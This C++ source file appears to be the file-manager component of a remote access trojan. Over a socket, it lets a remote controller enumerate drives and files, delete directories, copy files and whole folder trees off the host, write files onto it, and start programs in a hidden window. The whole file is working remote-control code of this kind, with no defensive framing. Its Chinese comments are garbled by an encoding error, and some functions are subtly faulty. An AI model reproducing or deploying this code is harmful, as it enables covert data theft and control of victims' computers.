// FileManager.cpp: implementation of the CFileManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "FileManager.h"
#include "Common.h"
#include "ClientSocket.h"
#include "SHELLAPI.H"
#include <IOSTREAM>

using namespace std;
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
typedef struct                 //0dwSizeHighdwSizeLow
{
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
}FILESIZE;
CFileManager::CFileManager(CClientSocket *pClient):CManager(pClient)
{
	m_nTransferMode = TRANSFER_MODE_NORMAL;

	SendDriveList();   //

}

CFileManager::~CFileManager()
{
	m_UploadList.clear();
}


UINT CFileManager::SendDriveList()              //��ñ��ض˵Ĵ�����Ϣ
{
	char	DriveString[256];
	                                            // ǰһ���ֽ�Ϊ��Ϣ���ͣ������52�ֽ�Ϊ���������������
	BYTE	DriveList[1024];
	char	FileSystem[MAX_PATH];
	char	*pDrive = NULL;
	DriveList[0] = TOKEN_DRIVE_LIST;            // �������б�
	GetLogicalDriveStrings(sizeof(DriveString), DriveString);

	//�����������Ϣ
	//0018F460  43 3A 5C 00 44 3A 5C 00 45 3A 5C 00 46 3A  C:\.D:\.E:\.F:
    //0018F46E  5C 00 47 3A 5C 00 48 3A 5C 00 4A 3A 5C 00  \.G:\.H:\.J:\.


	pDrive = DriveString;
	
	unsigned __int64	HDAmount = 0;
	unsigned __int64	HDFreeSpace = 0;
	unsigned long		AmntMB = 0; // �ܴ�С
	unsigned long		FreeMB = 0; // ʣ��ռ�
	

	//ע�������dwOffset���ܴ�0 ��Ϊ0��λ�洢������Ϣ����
	for (DWORD dwOffset = 1; *pDrive != '\0'; pDrive += lstrlen(pDrive) + 1)   //�����+1Ϊ�˹�\0
	{
		memset(FileSystem, 0, sizeof(FileSystem));
	
		// �õ��ļ�ϵͳ��Ϣ����С  C:
		GetVolumeInformation(pDrive, NULL, 0, NULL, NULL, NULL, FileSystem, MAX_PATH);
	
		SHFILEINFO	sfi;
		SHGetFileInfo(pDrive,FILE_ATTRIBUTE_NORMAL,&sfi,
			sizeof(SHFILEINFO), SHGFI_TYPENAME);
		
		int	nTypeNameLen = lstrlen(sfi.szTypeName) + 1;   
		int	nFileSystemLen = lstrlen(FileSystem) + 1;  
		
		// ������̴�С
		if (pDrive[0] != 'A' && pDrive[0] != 'B'
			&& GetDiskFreeSpaceEx(pDrive, (PULARGE_INTEGER)&HDFreeSpace, 
			(PULARGE_INTEGER)&HDAmount, NULL))
		{	
			AmntMB = HDAmount / 1024 / 1024;         //���������ֽ�Ҫת����G
			FreeMB = HDFreeSpace / 1024 / 1024;
		}
		else
		{
			AmntMB = 0;
			FreeMB = 0;
		}
		// ��ʼ��ֵ
		DriveList[dwOffset] = pDrive[0];                     //�̷�
		DriveList[dwOffset + 1] = GetDriveType(pDrive);      //������������
		
		
		// ���̿ռ�����ռȥ��8�ֽ�
		memcpy(DriveList + dwOffset + 2, &AmntMB, sizeof(unsigned long));
		memcpy(DriveList + dwOffset + 6, &FreeMB, sizeof(unsigned long));
		
		// ���̾��������������
		memcpy(DriveList + dwOffset + 10, sfi.szTypeName, nTypeNameLen);
		memcpy(DriveList + dwOffset + 10 + nTypeNameLen, FileSystem, nFileSystemLen);
		
		dwOffset += 10 + nTypeNameLen + nFileSystemLen;



	}
	
	return Send((LPBYTE)DriveList, dwOffset);    //�����ض˷�������
}


void CFileManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
	case COMMAND_LIST_FILES:// ��ȡ�ļ��б�
		{
			SendFilesList((char *)lpBuffer + 1);   //��һ���ֽ�����Ϣ �������·��
			break;
		}
	
	case COMMAND_RENAME_FILE:
		{
			Rename(lpBuffer + 1);
			break;
		}

	case COMMAND_DELETE_FILE:                      //ɾ���ļ�
		{
			DeleteFile((char *)lpBuffer + 1);
			SendToken(TOKEN_DELETE_FINISH);
			break;
		}
	
	case COMMAND_DELETE_DIRECTORY:				   //ɾ���ļ���
		{
			DeleteDirectory((char *)lpBuffer + 1);
			SendToken(TOKEN_DELETE_FINISH);
			break;
		}

	case COMMAND_CREATE_FOLDER:                   //����һ���µ��ļ���
		{
			CreateFolder(lpBuffer + 1);
			break;

		}
	case COMMAND_FILE_SIZE:                       //׼�������ļ�
		{
			CreateLocalRecvFile(lpBuffer + 1);
			break;
		}

	case COMMAND_DOWN_FILES:                      //׼�������ļ�
		{
			UploadToRemote(lpBuffer + 1);
			break;
		}

	case COMMAND_CONTINUE:                        //�����ļ�
		{
			SendFileData(lpBuffer + 1);
			break;
		}
	
	case COMMAND_SET_TRANSFER_MODE:
		{
			SetTransferMode(lpBuffer + 1);
			break;
		}	
	case COMMAND_FILE_DATA:
		{
			WriteLocalRecvFile(lpBuffer + 1, nSize -1);
			break;
		}
	case COMMAND_STOP:
		{
			StopTransfer();
			break;
		}
	case COMMAND_OPEN_FILE_SHOW:                               //��ʾ���г���
		{
			OpenFile((char *)lpBuffer + 1, SW_SHOW);
			break;
		}
	
	case COMMAND_OPEN_FILE_HIDE:
		{
			OpenFile((char *)lpBuffer + 1, SW_HIDE);		    //�������г���
			break;
		}
	
	default:
		break;
	}
}


UINT CFileManager::SendFilesList(LPCTSTR lpszDirectory)
{
	// ���ô��䷽ʽ
	m_nTransferMode = TRANSFER_MODE_NORMAL;	

	UINT	nRet = 0;
	char	strPath[MAX_PATH];
	char	*pszFileName = NULL;
	LPBYTE	lpList = NULL;
	HANDLE	hFile;
	DWORD	dwOffset = 0; // λ��ָ��
	int		nLen = 0;
	DWORD	nBufferSize =  1024 * 10; // �ȷ���10K�Ļ�����
	WIN32_FIND_DATA	FindFileData;
	
	lpList = (BYTE *)LocalAlloc(LPTR, nBufferSize);
	
	wsprintf(strPath, "%s\\*.*", lpszDirectory);
	hFile = FindFirstFile(strPath, &FindFileData);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		BYTE bToken = TOKEN_FILE_LIST;
		return Send(&bToken, 1);           //·������
	}
	
	*lpList = TOKEN_FILE_LIST;
	
	// 1 Ϊ���ݰ�ͷ����ռ�ֽ�,���ֵ
	dwOffset = 1;
	/*
	�ļ�����	1
	�ļ���		strlen(filename) + 1 ('\0')
	�ļ���С	4
	*/
	do 
	{
		// ��̬��չ������
		if (dwOffset > (nBufferSize - MAX_PATH * 2))
		{
			nBufferSize += MAX_PATH * 2;
			lpList = (BYTE *)LocalReAlloc(lpList, nBufferSize, LMEM_ZEROINIT|LMEM_MOVEABLE);
		}
		pszFileName = FindFileData.cFileName;
		if (strcmp(pszFileName, ".") == 0 || strcmp(pszFileName, "..") == 0)
			continue;
		// �ļ����� 1 �ֽ�
		*(lpList + dwOffset) = FindFileData.dwFileAttributes &	FILE_ATTRIBUTE_DIRECTORY;
		dwOffset++;
		// �ļ��� lstrlen(pszFileName) + 1 �ֽ�
		nLen = lstrlen(pszFileName);
		memcpy(lpList + dwOffset, pszFileName, nLen);
		dwOffset += nLen;
		*(lpList + dwOffset) = 0;
		dwOffset++;
		
		// �ļ���С 8 �ֽ�
		memcpy(lpList + dwOffset, &FindFileData.nFileSizeHigh, sizeof(DWORD));
		memcpy(lpList + dwOffset + 4, &FindFileData.nFileSizeLow, sizeof(DWORD));
		dwOffset += 8;
		// ������ʱ�� 8 �ֽ�
		memcpy(lpList + dwOffset, &FindFileData.ftLastWriteTime, sizeof(FILETIME));
		dwOffset += 8;
	} while(FindNextFile(hFile, &FindFileData));

	nRet = Send(lpList, dwOffset);

	LocalFree(lpList);
	FindClose(hFile);
	return nRet;
}


void CFileManager::Rename(LPBYTE lpBuffer)
{
	LPCTSTR lpExistingFileName = (char *)lpBuffer;
	LPCTSTR lpNewFileName = lpExistingFileName + lstrlen(lpExistingFileName) + 1;
	::MoveFile(lpExistingFileName, lpNewFileName);
	SendToken(TOKEN_RENAME_FINISH);
}

bool CFileManager::DeleteDirectory(LPCTSTR lpszDirectory)
{
	WIN32_FIND_DATA	wfd;
	char	lpszFilter[MAX_PATH];
	
	wsprintf(lpszFilter, "%s\\*.*", lpszDirectory);
	
	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE)                    // ���û���ҵ������ʧ��
		return FALSE;
	
	do
	{
		if (wfd.cFileName[0] != '.')
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				char strDirectory[MAX_PATH];
				wsprintf(strDirectory, "%s\\%s", lpszDirectory, wfd.cFileName);
				DeleteDirectory(strDirectory);
			}
			else
			{
				char strFile[MAX_PATH];
				wsprintf(strFile, "%s\\%s", lpszDirectory, wfd.cFileName);
				DeleteFile(strFile);
			}
		}
	} while (FindNextFile(hFind, &wfd));
	
	FindClose(hFind);                              // �رղ��Ҿ��
	
	if(!RemoveDirectory(lpszDirectory))
	{
		return FALSE;
	}
	return true;
}

void CFileManager::CreateFolder(LPBYTE lpBuffer)
{
	MakeSureDirectoryPathExists((char *)lpBuffer);
	SendToken(TOKEN_CREATEFOLDER_FINISH);
}



bool CFileManager::MakeSureDirectoryPathExists(LPCTSTR pszDirPath)
{
    LPTSTR p, pszDirCopy;
    DWORD dwAttributes;

    __try
    {
        pszDirCopy = (LPTSTR)malloc(sizeof(TCHAR) * (lstrlen(pszDirPath) + 1));

        if(pszDirCopy == NULL)
            return FALSE;

        lstrcpy(pszDirCopy, pszDirPath);

        p = pszDirCopy;

        if((*p == TEXT('\\')) && (*(p+1) == TEXT('\\')))
        {
            p++;        
            p++;            

             while(*p && *p != TEXT('\\'))
            {
                p = CharNext(p);
            }

            if(*p)
            {
                p++;
            }
            while(*p && *p != TEXT('\\'))
            {
                p = CharNext(p);
            }

            if(*p)
            {
                p++;
            }

        }
        else if(*(p+1) == TEXT(':')) 
        {
            p++;
            p++;

            if(*p && (*p == TEXT('\\')))
            {
                p++;
            }
        }

		while(*p)
        {
            if(*p == TEXT('\\'))
            {
                *p = TEXT('\0');
                dwAttributes = GetFileAttributes(pszDirCopy);
                if(dwAttributes == 0xffffffff)
                {
                    if(!CreateDirectory(pszDirCopy, NULL))
                    {
                        if(GetLastError() != ERROR_ALREADY_EXISTS)
                        {
                            free(pszDirCopy);
                            return FALSE;
                        }
                    }
                }
                else
                {
                    if((dwAttributes & FILE_ATTRIBUTE_DIRECTORY) != FILE_ATTRIBUTE_DIRECTORY)
                    {
                 
                        free(pszDirCopy);
                        return FALSE;
                    }
                }
 
                *p = TEXT('\\');
            }

            p = CharNext(p);
        }
    }
    __except(EXCEPTION_EXECUTE_HANDLER)
    {
      
        free(pszDirCopy);
        return FALSE;
    }

    free(pszDirCopy);
    return TRUE;
}


void CFileManager::CreateLocalRecvFile(LPBYTE lpBuffer)
{
	FILESIZE	*pFileSize = (FILESIZE *)lpBuffer;
	// ���浱ǰ���ڲ������ļ���
	memset(m_strCurrentProcessFileName, 0, sizeof(m_strCurrentProcessFileName));
	strcpy(m_strCurrentProcessFileName, (char *)lpBuffer + 8);  //�Ѿ�Խ����Ϣͷ��
	
	// �����ļ�����
	m_nCurrentProcessFileLength = 
		(pFileSize->dwSizeHigh * (MAXDWORD + 1)) + pFileSize->dwSizeLow;
	
	// �������Ŀ¼
	MakeSureDirectoryPathExists(m_strCurrentProcessFileName);
	
	
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = FindFirstFile(m_strCurrentProcessFileName, &FindFileData);
	
	if (hFind != INVALID_HANDLE_VALUE
		&& m_nTransferMode != TRANSFER_MODE_OVERWRITE_ALL 
		&& m_nTransferMode != TRANSFER_MODE_JUMP_ALL
		)
	{
		SendToken(TOKEN_GET_TRANSFER_MODE); //�������ͬ���ļ�
	}
	else
	{
		GetFileData();                      //���û����ͬ���ļ��ͻ�ִ�е�����
	}
	FindClose(hFind);
}

void CFileManager::GetFileData()           
{
	int	nTransferMode;
	switch (m_nTransferMode)   //���û����ͬ�������ǲ������Case�е�
	{
	case TRANSFER_MODE_OVERWRITE_ALL:
		nTransferMode = TRANSFER_MODE_OVERWRITE;
		break;
	case TRANSFER_MODE_ADDITION_ALL:
		nTransferMode = TRANSFER_MODE_ADDITION;
		break;
	case TRANSFER_MODE_JUMP_ALL:
		nTransferMode = TRANSFER_MODE_JUMP;
		break;
	default:
		nTransferMode = m_nTransferMode;
	}
	
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = FindFirstFile(m_strCurrentProcessFileName, &FindFileData);
	
	//1�ֽ�Token,���ֽ�ƫ�Ƹ���λ�����ֽ�ƫ�Ƶ���λ
	BYTE	bToken[9];
	DWORD	dwCreationDisposition; // �ļ��򿪷�ʽ 
	memset(bToken, 0, sizeof(bToken));
	bToken[0] = TOKEN_DATA_CONTINUE;
	
	// �ļ��Ѿ�����
	if (hFind != INVALID_HANDLE_VALUE)
	{
	
		// ����
		if (nTransferMode == TRANSFER_MODE_OVERWRITE)
		{
			//ƫ����0
			memset(bToken + 1, 0, 8);
			// ���´���
			dwCreationDisposition = CREATE_ALWAYS;
			
		}
		// ������һ��
		else if(nTransferMode == TRANSFER_MODE_JUMP)
		{
			DWORD dwOffset = -1;
			memcpy(bToken + 5, &dwOffset, 4);  //1  4 -1
			dwCreationDisposition = OPEN_EXISTING;
		}
	}
	else
	{

		memset(bToken + 1, 0, 8);                //û����ͬ���ļ����ߵ�����
		// ���´���
		dwCreationDisposition = CREATE_ALWAYS;
	}
	FindClose(hFind);
	
	HANDLE	hFile = 
		CreateFile
		(
		m_strCurrentProcessFileName, 
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		dwCreationDisposition,
		FILE_ATTRIBUTE_NORMAL,
		0
		);
	// ��Ҫ������
	if (hFile == INVALID_HANDLE_VALUE)
	{
		m_nCurrentProcessFileLength = 0;
		return;
	}
	CloseHandle(hFile);
	
	Send(bToken,sizeof(bToken));        //�������ƶ˷���TOKEN_DATA_CONTINUE��Ϣ
}

void CFileManager::WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize)
{
	BYTE	*pData;
	DWORD	dwBytesToWrite;
	DWORD	dwBytesWrite;
	int		nHeadLength = 9; // 1 + 4 + 4  ���ݰ�ͷ����С��Ϊ�̶���9
	FILESIZE	*pFileSize;
	// �õ����ݵ�ƫ��
	pData = lpBuffer + 8;
	
	pFileSize = (FILESIZE *)lpBuffer;
	
	// �õ��������ļ��е�ƫ��
	
	LONG	dwOffsetHigh = pFileSize->dwSizeHigh;
	LONG	dwOffsetLow = pFileSize->dwSizeLow;
	
	
	dwBytesToWrite = nSize - 8;
	
	HANDLE	hFile = 
		CreateFile
		(
		m_strCurrentProcessFileName,
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		0
		);
	
	SetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);
	
	int nRet = 0;
	// д���ļ�
	nRet = WriteFile
		(
		hFile,
		pData, 
		dwBytesToWrite, 
		&dwBytesWrite,
		NULL
		);

	CloseHandle(hFile);	
	BYTE	bToken[9];
	bToken[0] = TOKEN_DATA_CONTINUE;//TOKEN_DATA_CONTINUE
	dwOffsetLow += dwBytesWrite;    //8183
	memcpy(bToken + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
	memcpy(bToken + 5, &dwOffsetLow, sizeof(dwOffsetLow));
	Send(bToken, sizeof(bToken));


	//1 0  8183  
}





bool CFileManager::UploadToRemote(LPBYTE lpBuffer)
{   //01234567890AB

	if (lpBuffer[lstrlen((char *)lpBuffer) - 1] == '\\')   //�����һ���ļ���
	{
		FixedUploadList((char *)lpBuffer);
		if (m_UploadList.empty())
		{
			StopTransfer();                      //����ǿ��ļ������Ǿ�ֹͣ����                             
			return true;
		}
	}
	else
	{
		m_UploadList.push_back((char *)lpBuffer);          //�����һ���ļ�
	}
	
	list <string>::iterator it = m_UploadList.begin();

	//

	
	// ���͵�һ���ļ�
	SendFileSize((*it).c_str());
	
	return true;
}


bool CFileManager::FixedUploadList(LPCTSTR lpPathName)  // Music 1 1.txt 2.txt    3.txt
{
	WIN32_FIND_DATA	wfd;
	char	lpszFilter[MAX_PATH];
	char	*lpszSlash = NULL;
	memset(lpszFilter, 0, sizeof(lpszFilter));
	
	if (lpPathName[lstrlen(lpPathName) - 1] != '\\')
		lpszSlash = "\\";
	else
		lpszSlash = "";
	
	wsprintf(lpszFilter, "%s%s*.*", lpPathName, lpszSlash);
		
	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE)             //���û���ҵ������ʧ��
		return false;
	
	do
	{
		if (wfd.cFileName[0] != '.')
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				char strDirectory[MAX_PATH];
				wsprintf(strDirectory, "%s%s%s", lpPathName, lpszSlash, wfd.cFileName);
				FixedUploadList(strDirectory);    //���ļ��еľ͵ݹ�
			}
			else
			{
				char strFile[MAX_PATH];
				wsprintf(strFile, "%s%s%s", lpPathName, lpszSlash, wfd.cFileName);
				m_UploadList.push_back(strFile);  //���ļ��Ͳ��뵽�ṹ�� STL 
				//\music\1\1.txt0  \Music\1\2.txt  F:\Musi\3.txt   F:1.txt  2.txt  3.txt  F:bauud\1\1.txt  
			}
		}
	} while (FindNextFile(hFind, &wfd));
	
	FindClose(hFind); // �رղ��Ҿ��
	return true;
}


UINT CFileManager::SendFileSize(LPCTSTR lpszFileName)
{
	UINT	nRet = 0;
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
	// 1 �ֽ�token, 8�ֽڴ�С, �ļ�����, '\0'
	HANDLE	hFile;
	// ���浱ǰ���ڲ������ļ���
	memset(m_strCurrentProcessFileName, 0, sizeof(m_strCurrentProcessFileName));
	strcpy(m_strCurrentProcessFileName, lpszFileName);
	
	hFile = CreateFile(lpszFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;
	dwSizeLow =	GetFileSize(hFile, &dwSizeHigh);
	CloseHandle(hFile);
	// �������ݰ��������ļ�����
	int		nPacketSize = lstrlen(lpszFileName) + 10;
	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);
	memset(bPacket, 0, nPacketSize);
	
	bPacket[0] = TOKEN_FILE_SIZE;
	FILESIZE *pFileSize = (FILESIZE *)(bPacket + 1);
	pFileSize->dwSizeHigh = dwSizeHigh;
	pFileSize->dwSizeLow = dwSizeLow;
	memcpy(bPacket + 9, lpszFileName, lstrlen(lpszFileName) + 1);
	
	nRet = Send(bPacket, nPacketSize);
	LocalFree(bPacket);
	return nRet;
}



UINT CFileManager::SendFileData(LPBYTE lpBuffer)
{
	UINT		nRet;
	FILESIZE	*pFileSize;
	char		*lpFileName;
	
	pFileSize = (FILESIZE *)lpBuffer;
	lpFileName = m_strCurrentProcessFileName;
	
	// Զ��������������һ��
	if (pFileSize->dwSizeLow == -1)
	{
		UploadNext();
		return 0;
	}
	HANDLE	hFile;
	hFile = CreateFile(lpFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
		return -1;
	
	SetFilePointer(hFile, pFileSize->dwSizeLow, (long *)&(pFileSize->dwSizeHigh), FILE_BEGIN);
	
	int		nHeadLength = 9; // 1 + 4 + 4���ݰ�ͷ����С
	DWORD	nNumberOfBytesToRead = MAX_SEND_BUFFER - nHeadLength;
	DWORD	nNumberOfBytesRead = 0;
	
	LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, MAX_SEND_BUFFER);
	// Token,  ��С��ƫ�ƣ��ļ���������
	lpPacket[0] = TOKEN_FILE_DATA;
	memcpy(lpPacket + 1, pFileSize, sizeof(FILESIZE));
	ReadFile(hFile, lpPacket + nHeadLength, nNumberOfBytesToRead, &nNumberOfBytesRead, NULL);
	CloseHandle(hFile);
	
	
	if (nNumberOfBytesRead > 0)
	{
		int	nPacketSize = nNumberOfBytesRead + nHeadLength;
		nRet = Send(lpPacket, nPacketSize);
	}
	else
	{
		UploadNext();
	}
	
	LocalFree(lpPacket);
	
	return nRet;
}


void CFileManager::UploadNext()
{
	list <string>::iterator it = m_UploadList.begin();
	// ɾ��һ������
	m_UploadList.erase(it);
	// �����ϴ�����
	if(m_UploadList.empty())
	{
		SendToken(TOKEN_TRANSFER_FINISH);
	}
	else
	{
		// �ϴ���һ��
		it = m_UploadList.begin();
		SendFileSize((*it).c_str());
	}
}

void CFileManager::StopTransfer()
{
	if (!m_UploadList.empty())
		m_UploadList.clear();
	SendToken(TOKEN_TRANSFER_FINISH);
}

int CFileManager::SendToken(BYTE bToken)
{
	return Send(&bToken, 1);
}



void CFileManager::SetTransferMode(LPBYTE lpBuffer)
{
	memcpy(&m_nTransferMode, lpBuffer, sizeof(m_nTransferMode));
	GetFileData();
}


bool CFileManager::OpenFile(LPCTSTR lpFile, INT nShowCmd)
{
	char	lpSubKey[500];
	HKEY	hKey;
	char	strTemp[MAX_PATH];
	LONG	nSize = sizeof(strTemp);
	char	*lpstrCat = NULL;
	memset(strTemp, 0, sizeof(strTemp));
	
	char	*lpExt = strrchr(lpFile, '.');   //��λ�����һ��.Ҳ��������Ҫ�ļ�����
	if (!lpExt)
		return false;
	

	//��ѯ�����Ƿ����
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpExt, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);


	//��ѯ�Ӽ��Ƿ����
	memset(lpSubKey, 0, sizeof(lpSubKey));
	wsprintf(lpSubKey, "%s\\shell\\open\\command", strTemp);
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	memset(strTemp, 0, sizeof(strTemp));
	nSize = sizeof(strTemp);
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);
	
	lpstrCat = strstr(strTemp, "\"%1");
	if (lpstrCat == NULL)
		lpstrCat = strstr(strTemp, "%1");
	
	if (lpstrCat == NULL)
	{
		lstrcat(strTemp, " ");
		lstrcat(strTemp, lpFile);
	}
	else
		lstrcpy(lpstrCat, lpFile);
	
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	if (nShowCmd != SW_HIDE)
	{
		si.lpDesktop = "WinSta0\\Default";    //�Ƿ�����
	}
	else
	{
		si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
		si.wShowWindow = SW_HIDE;

		//cout<<"HideProcess"<<endl;
	}
	
	CreateProcess(NULL, strTemp, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
}